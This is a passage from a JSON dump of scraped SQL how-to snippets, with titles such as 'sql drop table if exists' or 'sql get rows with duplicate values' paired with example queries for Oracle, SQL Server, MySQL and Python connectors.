    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\n",
    "reg_date": "2021-10-12T10:00:10.000Z"
  },
  {
    "id": 3876,
    "keyword": null,
    "link": null,
    "title": " sql developer output window missing",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\n",
    "reg_date": "2021-10-12T10:00:10.000Z"
  },
  {
    "id": 3877,
    "keyword": null,
    "link": null,
    "title": " sql developer search all packages for text",
    "description": "SELECT name, line, text   FROM all_source  WHERE upper(text) like upper('%<<your_phrase>>%') escape '\\'  \n",
    "reg_date": "2021-10-12T10:00:10.000Z"
  },
  {
    "id": 3878,
    "keyword": null,
    "link": null,
    "title": " sql difference between tables",
    "description": "-- Oracle  -- Example SELECT *  FROM Table1 -- the table containing extra records   MINUS   SELECT *    FROM Table2;  -- Syntax  SELECT *  FROM <table-1> -- the table containing extra records   MINUS   SELECT *    FROM <table-2>;\n",
    "reg_date": "2021-10-12T10:00:10.000Z"
  },
  {
    "id": 3879,
    "keyword": null,
    "link": null,
    "title": " sql difference between two tables",
    "description": "(SELECT * FROM T1 MINUS SELECT * FROM T2)   -- Rows that are in T1 but not in T2 UNION ALL (SELECT * FROM T2 MINUS SELECT * FROM T1);  -- Rows that are in T2 but not in T1\n-- Oracle  -- Example SELECT *  FROM Table1 -- the table containing extra records   MINUS   SELECT *    FROM Table2;  -- Syntax  SELECT *  FROM <table-1> -- the table containing extra records   MINUS   SELECT *    FROM <table-2>;\nselect * from tableA minus select * from tableB \n",
    "reg_date": "2021-10-12T10:00:10.000Z"
  },
  {
    "id": 3880,
    "keyword": null,
    "link": null,
    "title": " sql disable safe mode",
    "description": "SET SQL_SAFE_UPDATES = 0;\nsql safe mode\nUPDATE tablename SET columnname=1;\n",
    "reg_date": "2021-10-12T10:00:11.000Z"
  },
  {
    "id": 3881,
    "keyword": null,
    "link": null,
    "title": " sql display max value",
    "description": "SELECT MAX(<numeric column>) FROM <table>; SELECT MAX(<numeric column>) FROM <table> GROUP BY <other column>;\n",
    "reg_date": "2021-10-12T10:00:11.000Z"
  },
  {
    "id": 3882,
    "keyword": null,
    "link": null,
    "title": " sql display today's date",
    "description": "SELECT getdate(); -- Get Current date in SQL Server\nSELECT getdate()\n",
    "reg_date": "2021-10-12T10:00:11.000Z"
  },
  {
    "id": 3883,
    "keyword": null,
    "link": null,
    "title": " sql distinct vs unique",
    "description": "SELECT [EmailAddress], [CustomerName] FROM [Customers] WHERE [EmailAddress] IN   (SELECT [EmailAddress] FROM [Customers] GROUP BY [EmailAddress] HAVING COUNT(*) > 1)\nUnique: helps to ensure that all the values in a column are different Distinct: helps to remove all the duplicate records when retrieving the records from a table.\n",
    "reg_date": "2021-10-12T10:00:11.000Z"
  },
  {
    "id": 3884,
    "keyword": null,
    "link": null,
    "title": " sql doesn't contain",
    "description": "/*Return data with the exception of the identified values*/ SELECT COLUMN1, COLUMN2 ... FROM SCHEMA_NAME.TABLE_NAME WHERE NOT (COLUMN1 LIKE '%VALUE%');\n",
    "reg_date": "2021-10-12T10:00:11.000Z"
  },
  {
    "id": 3885,
    "keyword": null,
    "link": null,
    "title": " sql double index",
    "description": "CREATE INDEX idx_actor_name ON ACTOR (LAST_NAME, FIRST_NAME);  SELECT * FROM CUSTOMER c WHERE ADDRESS_ID = 10 AND exists(     SELECT 1 FROM ACTOR a     WHERE c.FIRST_NAME = a.FIRST_NAME       AND c.LAST_NAME = a.LAST_NAME );\n",
    "reg_date": "2021-10-12T10:00:11.000Z"
  },
  {
    "id": 3886,
    "keyword": null,
    "link": null,
    "title": " sql drop column",
    "description": "ALTER TABLE table_name  DROP COLUMN column_name;\nALTER TABLE table_name DROP COLUMN column_name\nALTER TABLE \"table_name\" DROP \"column_name\";\nALTER TABLE tableName DROP columnName;\nALTER TABLE my_schema.my_table DROP COLUMN my_column;\nALTER TABLE \"table_name\" DROP COLUMN \"column_name\";\n",
    "reg_date": "2021-10-12T10:00:11.000Z"
  },
  {
    "id": 3887,
    "keyword": null,
    "link": null,
    "title": " sql drop database if exists",
    "description": "BY LOVE SINGH  USE master; GO ALTER DATABASE OnlineRestaurant2  SET SINGLE_USER  WITH ROLLBACK IMMEDIATE; GO DROP DATABASE OnlineRestaurant2;\nBY LOVE SINGH  USE master; GO ALTER DATABASE OnlineRestaurant2  SET SINGLE_USER  WITH ROLLBACK IMMEDIATE; GO DROP DATABASE OnlineRestaurant2; \nDROP DATABASE IF EXISTS TestDb; Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T10:00:11.000Z"
  },
  {
    "id": 3888,
    "keyword": null,
    "link": null,
    "title": " sql drop db",
    "description": "   DROP DATABASE databasename; \nThe DROP DATABASE statement drops all tables in the database and deletes the database permanently. Therefore, you should be very careful when using this statement.  The following shows the syntax of the DROP DATABASE statement:  DROP DATABASE [IF EXISTS] database_name;    In MySQL, the schema is the synonym for the database, therefore, you can use them interchangeably:  DROP SCHEMA [IF EXISTS] database_name;\n",
    "reg_date": "2021-10-12T10:00:11.000Z"
  },
  {
    "id": 3889,
    "keyword": null,
    "link": null,
    "title": " sql drop default",
    "description": "ALTER TABLE [TheTable] DROP CONSTRAINT [TheDefaultConstraint] \nRemoves a default value for a column. Example (MySQL): Removes the default value from the &lsquo;name&rsquo; column in the &lsquo;products&rsquo; table. ALTER TABLE products ALTER COLUMN name DROP DEFAULT;\n",
    "reg_date": "2021-10-12T10:00:11.000Z"
  },
  {
    "id": 3890,
    "keyword": null,
    "link": null,
    "title": " sql drop multiple columns if exists",
    "description": "-- SQL Server ALTER TABLE t DROP COLUMN IF EXISTS col1,                     COLUMN IF EXISTS col2;\nALTER TABLE TableName     DROP COLUMN Column1,     DROP COLUMN Column2; \n",
    "reg_date": "2021-10-12T10:00:12.000Z"
  },
  {
    "id": 3891,
    "keyword": null,
    "link": null,
    "title": " sql drop primary key",
    "description": "ALTER TABLE [table_name] DROP CONSTRAINT [primary_key_name]\n alter table Player DROP PRIMARY KEY;\nALTER TABLE Persons  DROP PRIMARY KEY; \n",
    "reg_date": "2021-10-12T10:00:12.000Z"
  },
  {
    "id": 3892,
    "keyword": null,
    "link": null,
    "title": " sql drop procedure if exists",
    "description": "DROP PROCEDURE IF EXISTS dbo.WelcomeMessage \n",
    "reg_date": "2021-10-12T10:00:12.000Z"
  },
  {
    "id": 3893,
    "keyword": null,
    "link": null,
    "title": " sql drop schema",
    "description": "-- EXAMPLE 1 DROP SCHEMA qlk2;  -- EXAMPLE 2 DROP SCHEMA IF EXISTS qlk2;  /* SYNTAX  DROP SCHEMA [IF EXISTS] <schema-name>;\n",
    "reg_date": "2021-10-12T10:00:12.000Z"
  },
  {
    "id": 3894,
    "keyword": null,
    "link": null,
    "title": " sql drop table",
    "description": "DROP TABLE table_name;\n-- Drop, but no space gain DROP TABLE table_name; -- Really frees space (Oracle) DROP TABLE table_name PURGE;\nDeletes a table from a database. Example: Removes the users table. DROP TABLE users;\nDROP object object_name  Examples: DROP TABLE table_name; table_name: Name of the table to be deleted.  DROP DATABASE database_name; database_name: Name of the database to be deleted. \n",
    "reg_date": "2021-10-12T10:00:12.000Z"
  },
  {
    "id": 3895,
    "keyword": null,
    "link": null,
    "title": " sql drop table if exists",
    "description": "DROP TABLE IF EXISTS dbo.Customers \nDROP TABLE IF EXISTS dbo.Scores\nIF OBJECT_ID('dbo.Scores', 'U') IS NOT NULL DROP TABLE dbo.Scores; \nIF OBJECT_ID('dbo.Scores', 'U') IS NOT NULL    DROP TABLE dbo.Scores;  \n-- Classic table IF OBJECT_ID('my_schema.my_table', 'U') IS NOT NULL DROP TABLE my_schema.my_table;  -- Temporary table IF OBJECT_ID('tempdb.my_schema.#my_table') IS NOT NULL DROP TABLE #my_table; \n",
    "reg_date": "2021-10-12T10:00:12.000Z"
  },
  {
    "id": 3896,
    "keyword": null,
    "link": null,
    "title": " sql drop view if exists",
    "description": "DROP VIEW IF EXISTS yourview;\nif exists(select 1 from sys.views where name='tst' and type='v') drop view tst; go  create view tst as select * from test\n",
    "reg_date": "2021-10-12T10:00:12.000Z"
  },
  {
    "id": 3897,
    "keyword": null,
    "link": null,
    "title": " sql drop with dependencies",
    "description": "DROP TABLE tableName CASCADE;  -- Table can also be schema or whatever else.\n",
    "reg_date": "2021-10-12T10:00:12.000Z"
  },
  {
    "id": 3898,
    "keyword": null,
    "link": null,
    "title": " sql eliminare un record",
    "description": "DELETE FROM nome_tabella [condizione]\n",
    "reg_date": "2021-10-12T10:00:12.000Z"
  },
  {
    "id": 3899,
    "keyword": null,
    "link": null,
    "title": " sql empty table",
    "description": "TRUNCATE TABLE  table_name; \nTRUNCATE TABLE table;\n-- Quick, no possible rollback TRUNCATE TABLE my_table; -- With possible rollback DELETE FROM my_table; COMMIT;  -- or ROLLBACK;\n",
    "reg_date": "2021-10-12T10:00:12.000Z"
  },
  {
    "id": 3900,
    "keyword": null,
    "link": null,
    "title": " sql end of month",
    "description": "SELECT EOMONTH('2019-02-15') end_of_month_feb2019; \n                                     EOMONTH(start_date [, offset] ); \n",
    "reg_date": "2021-10-12T10:00:12.000Z"
  },
  {
    "id": 3901,
    "keyword": null,
    "link": null,
    "title": " sql ends with string",
    "description": "-- Case insensitive SELECT * FROM my_table WHERE upper(my_column) LIKE 'SEARCHED %';  -- starts with SELECT * FROM my_table WHERE upper(my_column) LIKE '% SEARCHED';  -- ends with SELECT * FROM my_table WHERE upper(my_column) LIKE '%SEARCHED%';  -- contains\n",
    "reg_date": "2021-10-12T10:00:13.000Z"
  },
  {
    "id": 3902,
    "keyword": null,
    "link": null,
    "title": " sql escape quote",
    "description": "DECLARE @my_table TABLE (     [value] VARCHAR(200) )  INSERT INTO @my_table VALUES ('hi, my name''s tim.')  SELECT * FROM @my_table\n",
    "reg_date": "2021-10-12T10:00:13.000Z"
  },
  {
    "id": 3903,
    "keyword": null,
    "link": null,
    "title": " sql example",
    "description": " Using a SAMPLE clause, we can select random rows. SELECT * FROM table_name SAMPLE(10);\n-- SQL examples ---------------------------------------------------------------------------------------------------  -- http://inf-schule-db.informatik.uni-kl.de/SQLterra1.php -------------------------------------------------------- -- https://www.inf-schule.de/information/datenbanksysteme/terra/relationaledb -------------------------------------- CREATE TABLE `land` (   `LNR` varchar(4) NOT NULL,   `Name` varchar(50) NOT NULL,   `Einwohner` decimal(20,2) DEFAULT NULL,   `Flaeche` int(11) DEFAULT NULL,   `Hauptstadt` varchar(30) DEFAULT NULL,   `Kontinent` varchar(15) DEFAULT NULL,   `KontinentFlaeche` int(11) DEFAULT NULL,   `KontinentEinwohner` int(11) NOT NULL ); -- ---------------------------------------------------------------------------------------------------------------- INSERT INTO `land` (`LNR`, `Name`, `Einwohner`, `Flaeche`, `Hauptstadt`, `Kontinent`, `KontinentFlaeche`, `KontinentEinwohner`) VALUES ('A', '&Ouml;sterreich', '8.51', 83879, 'Wien', 'Europa', 10, 733), ('AC', 'Antigua und Barbuda', '0.09', 443, 'Saint John s', 'Nordamerika', 24, 523), ('AF', 'Afghanistan', '33.40', 652230, 'Kabul', 'Asien', 44, 4010), ('AG', 'Algerien', '37.40', 2381741, 'Algiers', 'Afrika', 30, 944), ('AL', 'Albanien', '2.80', 28748, 'Tirana', 'Europa', 10, 733); -- ---------------------------------------------------------------------------------------------------------------- CREATE TABLE `ort` (   `Name` varchar(30) DEFAULT NULL,   `Land` varchar(50) NOT NULL,   `Einwohner` int(11) DEFAULT NULL,   `Laenge` decimal(10,4) DEFAULT NULL,   `Breite` decimal(10,4) DEFAULT NULL ); -- ---------------------------------------------------------------------------------------------------------------- INSERT INTO `ort` (`Name`, `Land`, `Einwohner`, `Laenge`, `Breite`) VALUES ('Kabul', 'Afghanistan', 1400000, '69.0000', '34.0000'), ('Kandahar', 'Afghanistan', 323900, '65.0000', '31.0000'), ('Masar-e Scharif', 'Afghanistan', 250000, '67.0000', '36.0000'), ('Abnub', '&Auml;gypten', 70791, '31.1500', '27.2700'), ('Abo el Matamer', '&Auml;gypten', 47432, '30.1800', '30.9200'); -- ---------------------------------------------------------------------------------------------------------------- SELECT name, einwohner, hauptstadt   FROM land ORDER BY einwohner DESC -- ---------------------------------------------------------------------------------------------------------------- SELECT name   FROM land WHERE kontinent='europa' -- ---------------------------------------------------------------------------------------------------------------- SELECT name, einwohner   FROM land WHERE einwohner>=10 and einwohner<=100 ORDER BY einwohner DESC -- ---------------------------------------------------------------------------------------------------------------- SELECT name, hauptstadt   FROM land WHERE name LIKE '%Arm%' or name LIKE '%Bein%' -- ---------------------------------------------------------------------------------------------------------------- SELECT name, laenge   FROM ort WHERE land='Deutschland' and laenge<7.768 -- ---------------------------------------------------------------------------------------------------------------- SELECT name, hauptstadt, kontinent   FROM land WHERE kontinent IN ('Asien','Australien')  -- https://www.youtube.com/watch?v=91iNR0eG8kE -------------------------------------------------------------------- import mysql.connector db = mysql.connector.connect( \thost=\"localhost\", \tuser=\"root\", \tpasswd=\"root\", \tdatabase=\"testdatabase\" \t) mycurser = db.cursor() mycursor.execute(\"CREATE TABLE Person (name VARCHAR(50), age smallint UNSIGNED, personID int PRIMARY KEY AUTO_INCREMENT)\") mycursor.execute(\"DESCRIBE Person\") mycursor.execute(\"INSERT INTO Person (name, age) VALUES ('tech with tim', 45)\") mycursor.execute(\"SELECT * FROM Person\") -- https://www.youtube.com/watch?v=kUBGiABFFHc -------------------------------------------------------------------- import mysql.connector from datetime import datetime db = mysql.connector.connect( \thost=\"localhost\", \tuser=\"root\", \tpasswd=\"root\", \tdatabase=\"testdatabase\" \t) mycursor = db.cursor() mycursor.execute(\"CREATE TABLE Test (name varchar(50) NOT NULL, created datetime NOT NULL, gender ENUM('M', 'F', 'O'), id int PRIMARY KEY NOT NULL AUTO_INCREMENT)\") mycursor.execute(\"INSERT INTO Test (name, created, gender) VALUES (?,?,?)\", ('Tim', datetime.now(), 'M')) mycursor.execute(\"SELECT * FROM Test WHERE gender = 'M' ORDER BY id DESC\") mycursor.execute(\"ALTER TABLE Test ADD COLUMN food VARCHAR(50) NOT NULL\") mycursor.execute(\"DESCRIBE Test\") mycursor.fetchone() mycursor.execute(\"ALTER TABLE Test DROP food\") mycursor.execute(\"ALTER TABLE Test CHANGE name first_name VARCHAR(50)\") db.commit()\nSELECT * FROM users;\n",
    "reg_date": "2021-10-12T10:00:13.000Z"
  },
  {
    "id": 3904,
    "keyword": null,
    "link": null,
    "title": " sql example query",
    "description": "select [all/distinct] <COL1>, <COL2>, <COL3> from <TABLE_NAME> [join <JOIN_CONDITION>] [where <CONDITION>] [group by <COLUMN_NAME>] [having <SEARCH_CONDITION>] [order by <SORT_SPECIFICATION>]   /* Specifically for SQL -> Oracle  LEGEND:  [...]   :   optional entries <...>   :   your specific entry */\nSELECT * FROM users;\nSELECT column_name FROM table_name;\nSelect REGEXP FROM DUAL\n",
    "reg_date": "2021-10-12T10:00:13.000Z"
  },
  {
    "id": 3905,
    "keyword": null,
    "link": null,
    "title": " sql exclude duplicates and find even id",
    "description": "SELECT DISTINCT city FROM tablename WHERE id % 2 = 0 \n",
    "reg_date": "2021-10-12T10:00:13.000Z"
  },
  {
    "id": 3906,
    "keyword": null,
    "link": null,
    "title": " sql exists",
    "description": "IF EXISTS (SELECT * FROM tblGLUserAccess WHERE GLUserName ='xxxxxxxx')  BEGIN    SELECT 1  END ELSE BEGIN     SELECT 2 END\nChecks for the existence of any record within the subquery, returning true if one or more records are returned. Example: Lists any dealerships with a deal finance percentage less than 10. SELECT dealership_name FROM dealerships WHERE EXISTS (SELECT deal_name FROM deals WHERE dealership_id = deals.dealership_id AND finance_ percentage < 10);\n",
    "reg_date": "2021-10-12T10:00:13.000Z"
  },
  {
    "id": 3907,
    "keyword": null,
    "link": null,
    "title": " sql field equals multiple values",
    "description": "SELECT ads.*, location.county  FROM ads LEFT JOIN location ON location.county = ads.county_id WHERE ads.published = 1  AND ads.type = 13 AND ads.county_id IN (2, 5, 7, 9) \n",
    "reg_date": "2021-10-12T10:00:13.000Z"
  },
  {
    "id": 3908,
    "keyword": null,
    "link": null,
    "title": " sql find missing values between two tables",
    "description": "-- Returns missing my_table1 ID in my_table2  SELECT DISTINCT t1.* FROM my_table t1 LEFT OUTER JOIN my_table2 t2 ON t1.ID = t2.ID WHERE t2.ID is null; -- Or: SELECT t1.* FROM my_table1 t1 WHERE NOT EXISTS     (SELECT ID FROM my_table2 t2 WHERE t2.ID = t1.ID); -- Or: SELECT t1.* FROM my_table1 t1 WHERE t1.ID NOT IN     (SELECT ID FROM my_table2 t2 WHERE t2.ID = t1.ID);\n",
    "reg_date": "2021-10-12T10:00:13.000Z"
  },
  {
    "id": 3909,
    "keyword": null,
    "link": null,
    "title": " sql find not in list",
    "description": "SELECT * FROM TABLENAME WHERE ID NOT IN (1, 2, 3);\n",
    "reg_date": "2021-10-12T10:00:13.000Z"
  },
  {
    "id": 3910,
    "keyword": null,
    "link": null,
    "title": " sql find second highest salary employee",
    "description": "Both options you find max as a subset and then exclude from main select sql> SELECT MAX( col ) FROM table  \tWHERE col < ( SELECT MAX( col ) FROM table); sql> SELECT MAX(col) FROM table  WHERE col NOT IN (SELECT MAX(col) FROM table);\n/* sql 2nd highest salary employee */ select sal, ename from emp where sal =     (         select max(sal) from emp where sal <             (select max(sal) from emp)     ) ----------------------------------------------- option 2 select * from  (     select ename, sal, dense_rank() over(order by sal desc) rank     from emp ) where rank =2;\n/*  Highest salary by Department/Location   */ SELECT e.ename, e.sal, e.deptno, d.loc FROM emp e JOIN dept d ON e.deptno = d.deptno WHERE e.sal in ( \t   \tselect max(sal)    \tfrom emp    \tgroup by deptno )\n",
    "reg_date": "2021-10-12T10:00:13.000Z"
  },
  {
    "id": 3911,
    "keyword": null,
    "link": null,
    "title": " sql find table by name",
    "description": "select table_schema,        table_name from information_schema.tables where table_name like 'payment%'       and table_schema not in ('information_schema', 'pg_catalog')       and table_type = 'BASE TABLE' order by table_name,          table_schema; \n",
    "reg_date": "2021-10-12T10:00:14.000Z"
  },
  {
    "id": 3912,
    "keyword": null,
    "link": null,
    "title": " sql find tables primary keys",
    "description": "-- NOTE: this is for SQL-Oracle specifically  -- syntax: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = '<table-name>' -- Replace <table-name> with your table-name AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner   -- example: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = 'CUSTOMERS'  AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner\n",
    "reg_date": "2021-10-12T10:00:14.000Z"
  },
  {
    "id": 3913,
    "keyword": null,
    "link": null,
    "title": " sql finding longest and shortest names in a fleld",
    "description": "# IN the example below, \"CITY\" is the filed, \"STATION\" is the Table (SELECT CITY, LENGTH(CITY) FROM STATION ORDER BY LENGTH(CITY) ASC, CITY ASC LIMIT 1) UNION (SELECT CITY, LENGTH(CITY) FROM STATION ORDER BY  LENGTH(CITY) DESC, CITY DESC LIMIT 1)\n",
    "reg_date": "2021-10-12T10:00:14.000Z"
  },
  {
    "id": 3914,
    "keyword": null,
    "link": null,
    "title": " sql first",
    "description": "SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)     WHERE ROWNUM = 1; -- Oracle 12c: SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 1 ROW ONLY; SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 10 ROW ONLY; SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 10 ROWS ONLY;\n",
    "reg_date": "2021-10-12T10:00:14.000Z"
  },
  {
    "id": 3915,
    "keyword": null,
    "link": null,
    "title": " sql first character",
    "description": "Select First two Character in selected Field with Left(string,Number of Char in int)  SELECT LEFT(FName, 2) AS FirstName FROM dbo.NameMaster\n",
    "reg_date": "2021-10-12T10:00:14.000Z"
  },
  {
    "id": 3916,
    "keyword": null,
    "link": null,
    "title": " sql first day of current year",
    "description": "SELECT DATEADD(yy, DATEDIFF(yy, 0, GETDATE()), 0);\t\t\t-- SQL Server SELECT TRUNC(sysdate, 'YEAR') FROM DUAL;\t\t\t\t\t-- Oracle SELECT MAKEDATE(year(now()), 1);\t\t\t\t\t\t\t-- MySQL\n",
    "reg_date": "2021-10-12T10:00:14.000Z"
  },
  {
    "id": 3917,
    "keyword": null,
    "link": null,
    "title": " sql for loop",
    "description": "DECLARE \tn NUMBER(2); BEGIN \tFOR n IN 10 .. 15 LOOP     \tdbms_output.put_line('n= ' || n);     END LOOP; END;  # When executed the output should be... n= 10 n= 11 n= 12 n= 13 n= 14 n= 15 \n/* For loop in sql */ Example: DECLARE     a number(2);  BEGIN     FOR a in 10 .. 20 LOOP        dbms_output.put_line('value of a: ' || a);    END LOOP;  END;  /   Output: value of a: 10  value of a: 11  value of a: 12  value of a: 13  value of a: 14  value of a: 15  value of a: 16  value of a: 17  value of a: 18  value of a: 19  value of a: 20  \n",
    "reg_date": "2021-10-12T10:00:14.000Z"
  },
  {
    "id": 3918,
    "keyword": null,
    "link": null,
    "title": " sql foreign key",
    "description": "-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\n# A foreign key is essentially a reference to a primary # key in another table.  # A Simple table of Users,  CREATE TABLE users( \tuserId INT NOT NULL,   \tusername VARCHAR(64) NOT NULL,   \tpasswd VARCHAR(32) NOT NULL,   \tPRIMARY KEY(userId); ); # Lets add a LEGIT user! INSERT INTO users VALUES(1000,\"Terry\",\"Teabagface$2\");  # We will create an order table that holds a reference # to an order made by our Terry CREATE TABLE orders( \torderId INT NOT NULL,   \torderDescription VARCHAR(255),   \tordererId INT NOT NULL,   \tPRIMARY KEY(orderId),   \tFOREIGN KEY (ordererId) REFERENCES users(userId) ); # Now we can add an order from Terry INSERT INTO orders VALUES(0001,\"Goat p0rn Weekly\",1000);  # Want to know more about the plight of Goats? # See the link below\nA FOREIGN KEY is a key used to link two tables together. A FOREIGN KEY is a field (or collection of fields) in one table that refers to the PRIMARY KEY in another table. The table containing the foreign key is called the child table, and the table containing the candidate key is called the referenced or parent table.  Example: # creating table users CREATE TABLE users( \tuser_id INT NOT NULL,   \tuser_name VARCHAR(64) NOT NULL,   \tuser_pass VARCHAR(32) NOT NULL,   \tPRIMARY KEY(user_id); ); # adding user data INSERT INTO users VALUES(1,\"Raj\",\"raj@123\");  # creating table orders CREATE TABLE orders( \torder_id INT NOT NULL,   \torder_description VARCHAR(255),   \torderer_id INT NOT NULL,   \tPRIMARY KEY(order_id),   \tFOREIGN KEY (orderer_id) REFERENCES users(user_id) ); # adding order data INSERT INTO orders VALUES(1,\"Daily groceries\",1);\nALTER TABLE tryholpz_demo07.core_modules  ADD COLUMN belongs_to_role INT,  ADD FOREIGN KEY core_modules(belongs_to_role) REFERENCES role_specific_modules_info(id) ON DELETE CASCADE\nCREATE TABLE orders ( id int NOT NULL, user_id int, product_id int, PRIMARY KEY (id), FOREIGN KEY (user_id) REFERENCES users(id), FOREIGN KEY (product_id) REFERENCES products(id) );\ncreate table Jobs( job_id number not null, job_title varchar(30), min_salary number, max_salary number ); create table job_history( employee_id number not null, start_date date, end_date date, job_id number not null, department_id number ); alter table jobs add constraint pk_jobs primary key(job_id); alter table job_history add constraint fk_job foreign key(job_id) references jobs(job_id);\n",
    "reg_date": "2021-10-12T10:00:14.000Z"
  },
  {
    "id": 3919,
    "keyword": null,
    "link": null,
    "title": " sql from jupyter notebooks",
    "description": "# import packages import pandas as pd import sqlite3   # connect database and create cursor conn = sqlite3.connect('data.sqlite') cur = conn.cursor()  # executing the query cur.execute(\"\"\"SELECT * FROM employees LIMIT 5;\"\"\")  # creating a dataframe object df = pd.DataFrame(cur.fetchall())  # find database attributes from cursor.description to use as column names cur.description  # creating dataframe columns df.columns = [x[0] for x in cur.description] df.head()\n",
    "reg_date": "2021-10-12T10:00:14.000Z"
  },
  {
    "id": 3920,
    "keyword": null,
    "link": null,
    "title": " sql from null to not null",
    "description": "SELECT column_name FROM table_name  WHERE column_name IS NOT NULL;\nALTER TABLE ime_tabele ALTER stolpec SET NOT NULL;\n",
    "reg_date": "2021-10-12T10:00:14.000Z"
  },
  {
    "id": 3921,
    "keyword": null,
    "link": null,
    "title": " sql get all columns from one table but one from another inner join",
    "description": "SELECT myTable.*, otherTable.foo, otherTable.bar...\n",
    "reg_date": "2021-10-12T10:00:15.000Z"
  },
  {
    "id": 3922,
    "keyword": null,
    "link": null,
    "title": " sql get database name",
    "description": "To get the current database name use select db_name().  DB_NAME(Transact-SQL)\n",
    "reg_date": "2021-10-12T10:00:15.000Z"
  },
  {
    "id": 3923,
    "keyword": null,
    "link": null,
    "title": " sql get guid",
    "description": "SELECT NEWID()\n",
    "reg_date": "2021-10-12T10:00:15.000Z"
  },
  {
    "id": 3924,
    "keyword": null,
    "link": null,
    "title": " sql get last ID",
    "description": "SELECT MAX(id) FROM <tablename>\n\tSelect Distinct names.xyz        From nameList names        LEFT JOIN nameList idNum        ON idNum.xyz > names.xyz AND idNum.xyz IS NOT NULL        WHERE idNum.xyz IS NULL \n",
    "reg_date": "2021-10-12T10:00:15.000Z"
  },
  {
    "id": 3925,
    "keyword": null,
    "link": null,
    "title": " sql get month name",
    "description": "SELECT DATENAME(mm,GETDATE())[Month Name]\nSELECT GETDATE() 'Today', FORMAT(GETDATE(),'MMMM') 'Month Name' \n",
    "reg_date": "2021-10-12T10:00:15.000Z"
  },
  {
    "id": 3926,
    "keyword": null,
    "link": null,
    "title": " sql get most recent record",
    "description": "# Use the aggregate MAX(signin) grouped by id. This will list the most recent signin for each id.  SELECT   id,   MAX(signin) AS most_recent_signin FROM tbl GROUP BY id  # To get the whole single record, perform an INNER JOIN against a subquery which returns only the MAX(signin) per id. SELECT    tbl.id,   signin,   signout FROM tbl   INNER JOIN (     SELECT id, MAX(signin) AS maxsign FROM tbl GROUP BY id   ) ms ON tbl.id = ms.id AND signin = maxsign WHERE tbl.id=1\n",
    "reg_date": "2021-10-12T10:00:15.000Z"
  },
  {
    "id": 3927,
    "keyword": null,
    "link": null,
    "title": " sql get number of days between two dates",
    "description": "DECLARE      @start_dt DATETIME2= '2019-12-31 23:59:59.9999999',      @end_dt DATETIME2= '2020-01-01 00:00:00.0000000';  SELECT      DATEDIFF(year, @start_dt, @end_dt) diff_in_year,      DATEDIFF(quarter, @start_dt, @end_dt) diff_in_quarter,      DATEDIFF(month, @start_dt, @end_dt) diff_in_month,      DATEDIFF(dayofyear, @start_dt, @end_dt) diff_in_dayofyear,      DATEDIFF(day, @start_dt, @end_dt) diff_in_day,      DATEDIFF(week, @start_dt, @end_dt) diff_in_week,      DATEDIFF(hour, @start_dt, @end_dt) diff_in_hour,      DATEDIFF(minute, @start_dt, @end_dt) diff_in_minute,      DATEDIFF(second, @start_dt, @end_dt) diff_in_second,      DATEDIFF(millisecond, @start_dt, @end_dt) diff_in_millisecond;\nDATEDIFF(DAY, '1/1/2011', '3/1/2011')\n",
    "reg_date": "2021-10-12T10:00:15.000Z"
  },
  {
    "id": 3928,
    "keyword": null,
    "link": null,
    "title": " sql get rows with duplicate values",
    "description": "SELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1 \nSELECT name, COUNT(email)  FROM users GROUP BY email HAVING COUNT(email) > 1\n/* Gets reps */ SELECT fieldA, COUNT(*) FROM tableA GROUP BY fieldA HAVING COUNT(*) > 1  /* Use reps to filter results */ SELECT a.* FROM tableA a JOIN ( \tSELECT fieldA, COUNT(*) as 'count' \tFROM tableA \tGROUP BY fieldA \tHAVING COUNT(*) > 1 ) b ON a.fieldA = b.fieldA \nSELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1\nMultiple field= SELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1  Single field= SELECT _column, COUNT(*)  FROM _table GROUP BY _column HAVING COUNT(*) > 1\n",
    "reg_date": "2021-10-12T10:00:15.000Z"
  },
  {
    "id": 3929,
    "keyword": null,
    "link": null,
    "title": " sql get table last modified time",
    "description": "SELECT name, [modify_date] FROM sys.tables \n",
    "reg_date": "2021-10-12T10:00:16.000Z"
  },
  {
    "id": 3930,
    "keyword": null,
    "link": null,
    "title": " sql get user account",
    "description": "SELECT CURRENT_USER;\n",
    "reg_date": "2021-10-12T10:00:16.000Z"
  },
  {
    "id": 3931,
    "keyword": null,
    "link": null,
    "title": " sql get year from datetime field",
    "description": "SELECT YEAR(DateTimeField) FROM MyTable\n",
